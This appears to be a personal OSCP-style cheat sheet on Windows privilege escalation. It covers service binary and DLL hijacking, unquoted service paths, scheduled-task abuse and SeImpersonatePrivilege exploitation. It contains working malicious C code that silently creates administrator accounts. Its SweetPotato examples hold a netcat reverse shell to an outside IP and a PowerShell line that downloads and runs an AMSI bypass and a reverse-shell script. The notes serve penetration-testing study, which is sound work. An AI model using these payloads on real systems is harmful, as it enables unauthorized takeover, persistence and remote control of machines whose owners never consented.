> [!info] Always run **[SharpUp](https://github.com/GhostPack/SharpUp)** for privesc and **[LaZagne](https://github.com/AlessandroZ/LaZagne)** for credential dumping

**[Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)**

There are several key pieces of information we should always obtain:
```text
- Username and hostname
	# whoami
- Privileges 
	# whoami /priv
- Group memberships of the current user 
	# whoami /groups
- Existing users and groups (check for lateral movement or inherited privileges)
	# net user OR Get-LocalUser (users)
	# Get-LocalGroup (groups)
	# Get-LocalGroupMember <Group> (group members)
- Operating system, version and architecture (check for kernel exploits)
	# systeminfo
- Network information (check for pivoting)
	# ipconfig /all
	# route print
- Installed applications (check for exploits)
	# Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname (32-bit applications)
	# Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname (64-bit applications)
- Running processes
	# Get-Process
	# sc.exe qc "<Process>" (show info for process)
```

#### Finding files
| **Command**                                                                                        | **Description**         |
| -------------------------------------------------------------------------------------------------- | ----------------------- |
| `Get-ChildItem -Path C:\ -Include *.kdbx,*.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue` | Find files by extension |
With GUI interface we can execute `RunAs` if we have the user password to spawn a shell as the specified user:
`# runas /user:backupadmin cmd`

#### History

We can check the history, we may find something useful
`# Get-History`

If empty (the user has deleted it by command `Clear-History`, we can check the file
```shell
PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
	C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

PS C:\Users\dave> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Spawn a Powershell session with credentials:
```shell
PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

Or access with `evil-winrm`:
`evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"`

#### Automated Enumeration
**[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)**
**[SharpUp](https://github.com/GhostPack/SharpUp)**
**[Seatbelt](https://github.com/GhostPack/Seatbelt)**

#### Binary Hijacking

To get a list of all installed Windows services, we can choose various methods such as the GUI snap-in _services.msc_, the _Get-Service_ Cmdlet, or the _Get-CimInstance_ Cmdlet (superseding _Get-WmiObject_).
```shell
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Name                      State   PathName
----                      -----   --------
Apache2.4                 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
Appinfo                   Running C:\Windows\system32\svchost.exe -k netsvcs -p
mysql                     Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
```

Based on the output in Listing 40, the two XAMPP services _Apache2.4_ and _mysql_ stand out as the binaries are located in the `C:\xampp\` directory instead of `C:\Windows\System32\`. This means the service is user-installed and the software developer is in charge of the directory structure as well as permissions of the software. These circumstances make it potentially prone to service binary hijacking. Next, let's enumerate the permissions on both service binaries. We can choose between the traditional _icacls_ Windows utility or the PowerShell Cmdlet _Get-ACL.

```shell
PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)
```

The output of shows that members of the _Users_ group have the Full Access (F) permission, allowing us to write to and modify the binary and therefore, replace it. Due to the missing indicator _(I)_ preceding this permission, we know that it was set on purpose and not inherited by the parent directory. Administrators often set Full Access permissions when they configure a service and are not entirely sure about the required permissions. Setting it to Full Access avoids most permission problems, but creates a security risk as we'll show in this example.

Let's create a small binary on Kali, which we'll use to replace the original **mysqld.exe**. The following C code will create a user named _dave2_ and add that user to the local Administrators group using the _system_[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/windows-privilege-escalation/leveraging-windows-services/service-binary-hijacking#fn5) function. The cross-compiled version of this code will serve as our malicious binary. Let's save it on Kali in a file named **adduser.c**.

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

Next, we'll cross-compile the code on our Kali machine with _mingw-64. Since we know that the target machine is 64-bit, we'll cross-compile the C code to a 64-bit application with **x86_64-w64-mingw32-gcc**. In addition, we use **adduser.exe** as argument for **-o** to specify the name of the compiled executable.

```bash
kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

In order to execute the binary through the service, we need to restart it. We can use the **net stop** command to stop the service (If we don't have permissions we can reboot the server if possible)
(`Restart-Service BetaService` can be another command to restart the service)

```shell
PS C:\Users\dave> net stop mysql
```

We can try to restart the service with the following commands too:

```shell
PS C:\Users\dave> Stop-Service BackupMonitor
PS C:\Users\dave> Start-Service BackupMonitor
```

#### Service DLL Hijacking

**[OSCP Notes](https://notchxor.github.io/oscp-notes/4-win-privesc/6-dll-hijacking/)**
**[Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)**

Content in module 16.2.2

Move the binary to a Windows machine where you have admin access and open the binary with ProcessMonitor to check the dlls which are being loaded. Check **[dll search order](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking#dll-search-order)** to find a folder to locate the malicious dll file.

Now we can build a malicious dll with the following code: (Save it as .cpp file)

```c
#include <stdlib.h>
#include <windows.h>
 
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
            i = system ("net user rogue password123! /add");
            i = system ("net localgroup administrators rogue /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Now we can compile the dll with the following command: 
```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

And finally we just have to transfer the payload and place it in the folder we have previously located and restart/launch the service to trigger the dll
#### Unquoted Service Paths

Enumerate running and stopped services.

```shell
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName 

Name                      State   PathName
----                      -----   --------
GammaService              Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

The output shows a stopped service named _GammaService_. The unquoted service binary path contains multiple spaces and is therefore potentially vulnerable to this attack vector. A more effective way to identify spaces in the paths and missing quotes is using the _WMI command-line_ (WMIC) utility. We can enter **service** to obtain service information and the verb **get** with **name** and **pathname** as arguments to retrieve only these specific property values. We'll pipe the output of this command to **findstr** with **/i** for case-insensitive searching and **/v** to only print lines that don't match. As the argument for this command, we'll enter **"C:\Windows\"** to show only services with a binary path outside of the Windows directory. We'll pipe the output of this command to another **findstr** command, which uses **"""** as argument to print only matches without quotes.

Let's enter this command in **cmd.exe** instead of PowerShell to avoid escaping issues for the quote in the second _findstr_ command.[4](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/windows-privilege-escalation/leveraging-windows-services/unquoted-service-paths#fn4) Alternatively, we could use _Select-String_[5](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/windows-privilege-escalation/leveraging-windows-services/unquoted-service-paths#fn5) in PowerShell.

```shell
C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\" | findstr /i /v """
Name                                       PathName                                                          
GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

The output of this command only lists services that are potentially vulnerable to our attack vector, such as GammaService. Before we go on, let's check if we can start and stop the identified service as _steve_ with **Start-Service** and **Stop-Service**.

```shell
PS C:\Users\steve> Start-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...

PS C:\Users\steve> Stop-Service GammaService
```

The output from Listing 69 indicates that _steve_ has permissions to start and stop GammaService. Since we can restart the service ourselves, we don't need to issue a reboot to restart the service. Next, let's list the paths Windows uses to attempt locating the executable file of the service.

```text
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Let's check our access rights in these paths with **icacls**. We see that in `C:\` and `C:\Program Files` our user doesn't have write permissions

```console
PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                 BUILTIN\Administrators:(OI)(CI)(F)
                                 BUILTIN\Users:(OI)(CI)(RX,W)
                                 CREATOR OWNER:(OI)(CI)(IO)(F)
                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)
```

The output shows that BUILTIN\Users has Write (w) permissions on the path `C:\Program Files\Enterprise Apps`. Our goal is now to place a malicious file named `Current.exe` in `C:\Program Files\Enterprise Apps\` (Use a .exe binary from msfvenom). After that we start the service and the malicious binary will be executed, even if it throws an error.

```shell
PS C:\Users\steve> Start-Service GammaService
Start-Service : Service 'GammaService (GammaService)' cannot be started due to the following error: Cannot start
service GammaService on computer '.'.
At line:1 char:1
+ Start-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
   ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
```

We can do the same with PowerUp.ps1

```
PS C:\Users\dave> . .\PowerUp.ps1

PS C:\Users\dave> Get-UnquotedService

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True

PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"

ServiceName  Path                                         Command
-----------  ----                                         -------
GammaService C:\Program Files\Enterprise Apps\Current.exe net user john Password123! /add && timeout /t 5 && net loc...

PS C:\Users\steve> Restart-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...
Restart-Service : Failed to start service 'GammaService (GammaService)'.
At line:1 char:1
+ Restart-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Restart-Service]
   , ServiceCommandException
    + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.RestartServiceCommand
```

#### Scheduled Tasks

We can view scheduled tasks on Windows with the _Get-ScheduledTask_[1](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/windows-privilege-escalation/abusing-other-windows-components/scheduled-tasks#fn1) Cmdlet or the command **schtasks /query**.[2](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/windows-privilege-escalation/abusing-other-windows-components/scheduled-tasks#fn2) We'll use the latter for this example to review all scheduled tasks on CLIENTWK220. We enter **/fo** with **LIST** as argument to specify the output format as list. Additionally, we add **/v** to display all properties of a task

```shell
PS C:\Users\steve> schtasks /query /fo LIST /v

Folder: \Microsoft
HostName:                             CLIENTWK220
TaskName:                             \Microsoft\CacheCleanup
Next Run Time:                        7/11/2022 2:47:21 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/11/2022 2:46:22 AM
Last Result:                          0
Author:                               CLIENTWK220\daveadmin
Task To Run:                          C:\Users\steve\Pictures\BackendCacheCleanup.exe
Start In:                             C:\Users\steve\Pictures
```

Interestingly, the task was created by _daveadmin_ and the specified action is to execute **BackendCacheCleanup.exe** in the **Pictures** home directory of _steve_. In addition, the times from _Last Run Time_ and _Next Run Time_ indicate that the task is executed every minute. The task runs as user _daveadmin_. Since the executable file **BackendCacheCleanup.exe** is located in a subdirectory of the home directory of _steve_, we should have extensive permissions on it. Let's check our permissions on this file with **icacls**.

```shell
PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                BUILTIN\Administrators:(I)(F)
                                                CLIENTWK220\steve:(I)(F)
                                                CLIENTWK220\offsec:(I)(F)
```

We have permission so we can place a malicious binary file

#### Kernel Exploits

Privileges that may lead to privilege escalation are _SeBackupPrivilege_, _SeAssignPrimaryToken_, _SeLoadDriver_, and _SeDebug_. We will be abusing SeImpersonatePrivilege.

```
C:\Users\dave> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeSecurityPrivilege           Manage auditing and security log          Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

PS C:\Users\dave> .\PrintSpoofer64.exe -i -c powershell.exe
.\PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
nt authority\system
```

While PrintSpoofer provided us a straightforward exploit process to elevate our privileges, there are also other tools that can abuse _SeImpersonatePrivilege_ for privilege escalation. Variants from the _Potato_[9](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/windows-privilege-escalation/abusing-other-windows-components/using-exploits#fn9) family (for example _RottenPotato_, _SweetPotato_, or _JuicyPotato_) are such tools. We should take the time to study these tools as they are an effective alternative to PrintSpoofer.
	* USE **GODPOTATO** OR **SWEETPOTATO**

Sweetpotato examples:
```shell
.\SweetPotato.exe -a "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.112.147 8081"
./SweetPotato.exe -a "/c powershell.exe iex (New-Object Net.WebClient).DownloadString('http://<IP>:8090/amsi.txt'); iex (New-Object Net.WebClient).DownloadString('http://<IP>:8090/Invoke-PowerShellTcp2.ps1')"
```

**SeBackupPrivilege**:
https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1
```shell
Import-Module .\Acl-FullControl.ps1
Acl-FullControl -user vault\anirudh -path C:\Users\Administrator -
type C:\Users\Administrator\Desktop\proof.txt
```
#### SAM, Security and System files

With this files we can dump credentials using impacket-secretsdump. We can get this files if we are admins or maybe check for folders like windows.old and check there inside .\\Windows\\System32 folder

#### Stealing NTLM Hash with Responder
[[Cheatsheets/Mix-OSCP-CPTS/Windows/2. Attacking AD#Stealing NTLM hashes with Responder]]

#### Find some services
```
PS C:\> cd hklm:\system\CurrentControlSet\services\
PS HKLM:\system\CurrentControlSet\services\> ls | findstr /i cleanup
PS HKLM:\system\CurrentControlSet\services\> ls cleanup
```